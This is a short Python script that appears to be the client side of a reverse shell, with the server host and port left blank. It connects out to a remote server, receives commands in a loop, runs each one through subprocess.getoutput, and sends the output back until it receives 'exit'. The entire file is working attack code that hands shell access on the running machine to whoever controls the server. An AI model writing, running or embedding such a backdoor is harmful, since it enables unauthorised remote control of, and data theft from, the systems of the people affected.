import socket
import subprocess

SERVER_HOST = ""
SERVER_PORT = 0000
BUFFER_SIZE = 0000

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)

while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        break

    output = subprocess.getoutput(command)
    s.send(output.encode())

s.close()
